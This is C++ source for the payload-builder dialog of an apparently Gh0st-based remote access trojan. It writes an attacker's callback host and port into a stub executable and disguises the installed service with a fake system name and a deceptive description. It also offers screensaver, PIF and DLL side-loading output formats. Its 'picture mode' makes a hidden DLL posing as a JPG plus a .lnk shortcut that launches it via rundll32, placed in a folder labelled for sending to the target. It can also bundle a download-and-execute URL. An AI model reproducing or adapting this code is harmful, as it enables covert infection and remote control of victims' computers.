#include "stdafx.h"
#include "Client.h"
#include "BuildDlg.h"
#include "ClientView.h"
#include <shlwapi.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CBuildDlg dialog


CBuildDlg::CBuildDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CBuildDlg::IDD, pParent)
{
	bIsDllinfo = FALSE;
	Pattern = false;
	//{{AFX_DATA_INIT(CBuildDlg)
	m_edit_host = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "HOST", _T("127.0.0.1"));
	m_service_name = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "SVCNAME", _T("SRDSLFT"));
	m_service_displayname = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DISNAME", _T("System Remotes Data Simulation Layer"));
	m_service_description = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "SVCDES", _T("Managing core services based on component object models. If the service is disabled, the computer will not function properly."));
	m_check_noinstall = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "NoInstall",  TRUE);
	m_edit_remark = _T("");
	m_edit_port = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "PORT",  8001);
	m_zkfkzj = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","Kzjizms",0);
	m_edit_kb = _T("https://www.baidu.com/img/bd_logo1.png");
	
	m_kbcheck = FALSE;
	//}}AFX_DATA_INIT
}


void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildDlg)
	DDX_Control(pDX, IDC_EDIT_LOG, m_edit_log);
	DDX_Control(pDX, IDC_COMBO_GROUP_NAME, m_group_name);
	DDX_Text(pDX, IDC_EDIT_HOST, m_edit_host);
	DDX_Text(pDX, IDC_EDIT_SERVICE_NAME, m_service_name);
	DDX_Text(pDX, IDC_EDIT_SERVICE_DISPLAYNAME, m_service_displayname);
	DDX_Text(pDX, IDC_EDIT_SERVICE_DESCRIPTION, m_service_description);
	DDX_Check(pDX, IDC_CHECK_NOINSTALL, m_check_noinstall);
	DDX_Text(pDX, IDC_EDIT_REMARK, m_edit_remark);
	DDX_Text(pDX, IDC_EDIT_PORT, m_edit_port);
	DDV_MinMaxUInt(pDX, m_edit_port, 0, 65535);
	DDX_Check(pDX, IDC_ZKFKZJ, m_zkfkzj);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	//{{AFX_MSG_MAP(CBuildDlg)
	ON_BN_CLICKED(IDC_CHECK_NOINSTALL, OnCheckNoinstall)
	ON_WM_PAINT()
	ON_BN_CLICKED(IDC_BUTTON_TEST_CONNECT, OnButtonTestConnect)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_PATTERN, OnPattern)
	ON_BN_CLICKED(IDC_KBTEST, OnKbtest)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbcheck)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildDlg message handlers

void CBuildDlg::LogOut(LPCSTR outtext)
{
	int length = m_edit_log.GetWindowTextLength(); 
	m_edit_log.SetSel(length, length);
	m_edit_log.ReplaceSel (outtext); 
}

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

BOOL CBuildDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	CheckRadioButton(IDC_EDIT_LOG,IDC_EDIT_LOG,IDC_EDIT_LOG);

	LogOut(" 正在为你检查更新...");
	LogOut("\r\n\r\n 版本已为最新版本");

	// TODO: Add extra initialization here
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for ( int i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_group_name.AddString(strGroupName);
	}
	m_group_name.SetCurSel(0);

	if (bIsDllinfo)
	{
		SetDlgItemText(IDC_EDIT_HOST,m_dll_info.LoginAddr);
		CString str;
		str.Format("%d",m_dll_info.LoginPort);
		SetDlgItemText(IDC_EDIT_PORT,str);
		SetDlgItemText(IDC_EDIT_SERVICE_NAME,m_dll_info.ServiceName);
		GetDlgItem(IDC_EDIT_SERVICE_NAME)->EnableWindow(FALSE);
		SetDlgItemText(IDC_EDIT_SERVICE_DISPLAYNAME,m_dll_info.ServiceDisplayName);
		SetDlgItemText(IDC_EDIT_SERVICE_DESCRIPTION,m_dll_info.ServiceDescription);
		SetDlgItemText(IDC_EDIT_REMARK,m_dll_info.strRemark);
		SetDlgItemText(IDC_COMBO_GROUP_NAME,m_dll_info.UpGroup);
		((CButton*)GetDlgItem(IDC_CHECK_NOINSTALL))->SetCheck(m_dll_info.NoInstall);

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
    	str = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		str += " 的配置信息";

		m_edit_log.ReplaceSel(str);
		SetWindowText(str);

		SetDlgItemText(IDOK,"修改配置");
		return TRUE;
	}

	OnCheckNoinstall();



 
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}


DLL_INFO dll_info = 
{
	"jhjggldccSS",
		4450,
		"",
		"",
		"",
		"",
		"",
		FALSE,
		0,                        //0为共同安装      1为离线记录安装
		'"',           //网络捆绑
};


void ReplaceExeIco(LPCTSTR lpszApp, LPCTSTR lpszIco)
{
    try
    {
        CFile file(lpszIco, CFile::modeRead);
        LONG lOffset = 0;
        DWORD dwSize = 0;
        DWORD dwBytes = 0;
        CONST BYTE bGroupIcoSize = 0x18;
        BYTE* lpGroupIco = new BYTE[bGroupIcoSize];
        memset(lpGroupIco, 0, bGroupIcoSize);
        file.Read(lpGroupIco, 0x06);
        file.Read(lpGroupIco+0x08, 0x0C);
        memcpy(&dwSize, lpGroupIco+0x10, sizeof(DWORD));
        file.Read(&lOffset, sizeof(lOffset));
        BYTE* lpRes = new BYTE[dwSize];
        memset(lpRes, 0, dwSize);
        file.Seek(lOffset, CFile::begin);
        file.Read(lpRes, dwSize);

        HANDLE hApp = BeginUpdateResource(lpszApp, NULL);
        UpdateResource(hApp, RT_GROUP_ICON, MAKEINTRESOURCE(1), 0, lpGroupIco, bGroupIcoSize);
        UpdateResource(hApp, RT_ICON, MAKEINTRESOURCE(1), 0, lpRes, dwSize);

        EndUpdateResource(hApp, FALSE);

        delete[] lpRes;
        delete[] lpGroupIco;
        file.Close();
    }
    catch (CException* e)
    {
        e->ReportError();
        e->Delete();
    }
}

HBRUSH CBuildDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_LOG) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);
		return CreateSolidBrush(clr);
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

BOOL CBuildDlg::CreateServer(DLL_INFO *lpData,LPSTR szPath,char *datPaths)
{
	CopyFile(datPaths,szPath,FALSE);
	
	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);

		DWORD SizePoint = MemFindStr(Buffer,"jhjggldccSS",Size,0);//
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			WriteFile(m_Handle,lpData,sizeof(DLL_INFO),&Written,NULL);
		}
		CloseHandle(m_Handle);
	}
	return TRUE;
}

//创建快捷方式
BOOL CreateLink(LPSTR   szPath,//快捷方式的c目标应用程序名   
				LPSTR   szLink,//快捷方式的数据文件名(*.lnk)
				//	LPSTR   sPath,
				LPCSTR pszArgs,//快捷方式的参数
				WORD	wHotkey)  //默认写NULL即可
{
	HRESULT   hres;   
	IShellLink* psl;   
	IPersistFile*   ppf;   
	WCHAR wsz[MAX_PATH];  
	BOOL bRet = FALSE;
	////初始化COM   
	CoInitialize(NULL);  
	
	//创建一个IShellLink实例   
	hres = CoCreateInstance(CLSID_ShellLink,NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&psl);   
	if(SUCCEEDED(hres))   
	{
		//设置目标应用程序   
		psl->SetPath(szPath);  
		
		//设置快捷键(此处设为Shift+Ctrl+'R')  
		//psl->SetHotkey( wHotkey);  
		
		//	*strrchr( szPath, '\\' ) = '\0';
		psl->SetWorkingDirectory("%windows%\\system32");	//设置工作目录
		psl->SetArguments(pszArgs);
		
		//从IShellLink获取其IPersistFile接口   
		//用于保存快捷方式的数据文件   (*.lnk)   
		hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
		if(SUCCEEDED(hres))
		{
			//确保数据文件名为ANSI格式   
			MultiByteToWideChar(CP_ACP, 0, szLink, -1, wsz, MAX_PATH);  
			//调用IPersistFile::Save   
			//保存快捷方式的数据文件   (*.lnk)   
			hres = ppf->Save(wsz, STGM_READWRITE);   
			//释放IPersistFile和IShellLink接口   
			ppf->Release();
			psl->Release();
			//			bRet = TRUE;
		}
	}  
	CoUninitialize();   
	return 0;
}
void CBuildDlg::OnOK() 
{
	// TODO: Add extra validation here
	UpdateData(TRUE);
	CString strGroup,Conpass;
	((CEdit*)GetDlgItem(IDC_COMBO_GROUP_NAME))->GetWindowText(strGroup);

	if (bIsDllinfo)
	{
		AfxMessageBox("发送成功");
		return;
	}
	// 网络捆绑
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(dll_info.szDownRun,m_edit_kb.GetBuffer(0));
	}
	lstrcpy(dll_info.LoginAddr,m_edit_host.GetBuffer(0));
	dll_info.LoginPort=m_edit_port;
	lstrcpy(dll_info.ServiceName,m_service_name.GetBuffer(0));
	lstrcpy(dll_info.ServiceDisplayName,m_service_displayname.GetBuffer(0));
	lstrcpy(dll_info.ServiceDescription,m_service_description.GetBuffer(0));
	lstrcpy(dll_info.UpGroup,strGroup.GetBuffer(0));
	lstrcpy(dll_info.strRemark,m_edit_remark.GetBuffer(0));
	dll_info.NoInstall = m_check_noinstall;
	dll_info.Dele_Kzj = m_zkfkzj;  //离线记录

	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "HOST",m_edit_host);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "PORT",m_edit_port);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "SVCNAME",m_service_name);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DISNAME", m_service_displayname);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "SVCDES", m_service_description);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "NoInstall",  m_check_noinstall);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","Kzjizms",m_zkfkzj);   //离线记录
	m_edit_log.ReplaceSel( "保存配置信息\r\n");
	//TRUE 多文件  FALSE单文件
	GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
	if (!Pattern)
	{	
	GetModuleFileName( NULL, DatPath, sizeof(DatPath) );
	*strrchr( DatPath, '\\' ) = '\0';
	lstrcat( DatPath, "\\更新\\Install.dat" );
	CFileDialog dlg(FALSE, "exe", "libcurl", OFN_OVERWRITEPROMPT,"可执行文件(*.exe)|*.exe|白加黑(*.dll)|*.dll|DOS快捷方式|*.pif|屏幕保护程序 (*.scr)|*.scr|批处理 (*.bat)|*.bat|DOS应用程序(*.com)|*.com|All Files (*.*)|*.*||", NULL);
	if(dlg.DoModal () != IDOK)
		return;	
	PCHAR ExeBuff = NULL;
	HANDLE hFile = NULL;
	DWORD FileSize = 0, dwTmp = 0;
	
	hFile = CreateFile( DatPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE ) 
	{
		m_edit_log.ReplaceSel( "读取Dat错误\r\n");
		return;
	}else
		m_edit_log.ReplaceSel( "读取Dat成功\r\n");	
	FileSize = GetFileSize( hFile, NULL );
	ExeBuff = (PCHAR)malloc(FileSize);
	memset( ExeBuff, 0, FileSize );
	ReadFile( hFile, ExeBuff, FileSize, &dwTmp, NULL );
	//这里读取到Dat的上线储存地址
	int moffset = memfind(ExeBuff, "jhjggldccSS", FileSize, 0);
	if (moffset == 0)
	{
		m_edit_log.ReplaceSel( "未读取到配置信息\r\n");
		return;
	}else
		m_edit_log.ReplaceSel( "读取到配置信息,准备写入\r\n");
	char	*lpszSlash = NULL;
	m_edit_log.ReplaceSel( "信息准备完成,开始写入\r\n");
	memcpy(ExeBuff+ moffset, &dll_info, sizeof(dll_info));//更新配置信息到内存数据
	CloseHandle(hFile);
	hFile = CreateFile( dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE ) 
		m_edit_log.ReplaceSel( "创建文件出错\r\n");
	if(!WriteFile( hFile, ExeBuff, FileSize, &dwTmp, NULL ))
		m_edit_log.ReplaceSel( "写入文件出错\r\n");
	else
		m_edit_log.ReplaceSel( "---------生成文件ok---------\r\n");

	CloseHandle(hFile);
	free(ExeBuff);
	Sleep(50);
     MessageBox("   生成完毕");

	}
	else
	{
		LogOut("\r\n当前使用的是图片模式...\r\n");	
		TCHAR szSaveFile[MAX_PATH]={0};
		GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
		PathRemoveFileSpec(patht);//去除文件名中的gh0st
		
		char MyDir[MAX_PATH],LinkPath[MAX_PATH],DllDatpath[MAX_PATH],DLLJPG[MAX_PATH];
		
		SHGetSpecialFolderPath(this->GetSafeHwnd(),MyDir,CSIDL_DESKTOP,0);
		
		CString PathName ="发送给目标的文件夹";
		
		strcat(MyDir,"\\" + PathName + "\\");//把编辑框文件夹名复制给创建文件夹路径
		CreateDirectory(MyDir,NULL);				//创建文件夹
		
		
		sprintf(DllDatpath,"%s\\更新\\JPG.dat",patht);	//获取DLL路径地址
		sprintf(DLLJPG,"%sDLL.jpg",MyDir);				//重命名DLL
		sprintf(LinkPath,"%s图片.jpg.lnk",MyDir);			//LNK地址
		
		if (CreateServer(&dll_info,DLLJPG,DllDatpath)==FALSE)
		{
			MessageBox("服务端生成失败!");
			return;
		}
		
		SetFileAttributes(DLLJPG,7);//设置文件属性
		
		CreateLink("rundll32.exe",LinkPath,"DLL.jpg Shellex",NULL);	
		PathRemoveFileSpec(szSaveFile);//去除文件名中的gh0st
		sprintf(szSaveFile,"%sDLL.jpg",MyDir);//重命名DLL.jpg
		
		
		CString szTempTips;
		szTempTips.Format("保存在:%s",MyDir);
		LogOut("\r\n" + szTempTips + "\r\n");
	}
	return;
	CDialog::OnOK();
}

void CBuildDlg::OnCheckNoinstall() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if(m_check_noinstall)
	{
		GetDlgItem(IDC_EDIT_SERVICE_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SERVICE_DISPLAYNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_SERVICE_DESCRIPTION)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_SERVICE_NAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SERVICE_DISPLAYNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_SERVICE_DESCRIPTION)->EnableWindow(TRUE);
	}
	UpdateData(FALSE);
}


void CBuildDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here

	// Do not call CDialog::OnPaint() for painting messages
}

void CBuildDlg::OnButtonTestConnect() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if (m_edit_host.IsEmpty())
	{
		MessageBox("请填写上线地址...","提示...", MB_ICONINFORMATION);
		return;
	}
	GetDlgItem(IDC_BUTTON_TEST_CONNECT)->EnableWindow(FALSE);

	TestMaster(m_edit_host.GetBuffer(0),m_edit_port);

	GetDlgItem(IDC_BUTTON_TEST_CONNECT)->EnableWindow(TRUE);

}

void CBuildDlg::TestMaster(char * strIP,UINT nPort) 
{
	// TODO: Add your control notification handler code here
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);


	CString	strResult;
	CString	strResulr = "连接失败... ";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		::MessageBox(m_hWnd,"测试连接初始化失败... ","提示...", MB_ICONINFORMATION);
		return ;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(strIP);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
	
fail:
	closesocket(sRemote);
	WSACleanup();

	strResult.Format("域名/IP上线信息: \n域名 IP：%s  \n连接端口: %d ",strIP,nPort);
	if (bRet)
		strResulr = "连接成功... ";
	
	::MessageBox(m_hWnd,strResult,strResulr,MB_ICONINFORMATION);
}

static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CBuildDlg::OnRandom() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	RandMoniCount++;
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
//			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}
	
	SetDlgItemText(IDC_EDIT_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_EDIT_SERVICE_DISPLAYNAME,ServerShow);
	SetDlgItemText(IDC_EDIT_SERVICE_DESCRIPTION,ServerDesc);
}
void CBuildDlg::OnPattern() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if (!Pattern)
	{
		Pattern = true;
		SetWindowText("服务生成 ->当前为图片模式");
	}
	else
	{
		Pattern = false;
		SetWindowText("服务生成 ->当前为单文件模式");
	}

}
BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}


bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return TRUE;
	
}

void CBuildDlg::OnKbtest() 
{
    UpdateData(TRUE);
	int	nUrlLength;
	char	*lpURL = NULL;
	char szFile[512] = {0};
	char	*lpFileName = NULL;
	nUrlLength = m_edit_kb.GetLength();
	if (nUrlLength == 0)
	{
		AfxMessageBox("数据为空");
		return ;
	}
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, m_edit_kb.GetBuffer(0), nUrlLength + 1);
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
	{
		AfxMessageBox("无法获取文件名");
		return;
	}
	
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
		{
			AfxMessageBox("文件下载成功，但是文件不存在，很可能被杀毒软件查杀或者文件名出错");
			return ; 
		}
	}else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
	{
		AfxMessageBox("URL 不正确，文件下载失败	");
		return ;    //URL 不正确，文件下载失败	
	}else
	{
		AfxMessageBox("文件下载失败，请检查URL是否正确	");
		return ; //文件下载失败，请检查URL是否正确
	}
    OpenFile(szFile,SW_SHOW);
	
}

void CBuildDlg::OnKbcheck() 
{
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
	
}
